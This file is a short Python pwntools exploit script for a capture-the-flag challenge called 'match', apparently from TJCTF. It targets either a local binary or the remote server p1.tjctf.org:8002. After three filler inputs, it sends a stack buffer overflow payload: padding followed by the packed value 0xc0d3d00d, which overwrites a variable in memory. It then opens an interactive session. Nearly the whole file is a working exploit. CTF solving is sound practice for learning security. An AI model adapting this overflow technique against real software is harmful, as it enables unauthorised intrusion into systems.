from pwn import *

e = ELF("./match")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("p1.tjctf.org", 8002)
else:
  p = process(e.path)

p.sendlineafter(":", "asdf")
p.sendlineafter(":", "asdf")
p.sendlineafter(":", "asdf")
debug()
p.sendlineafter(":", "A" * (0x88 - 0x14) + p64(0xc0d3d00d))


p.interactive()
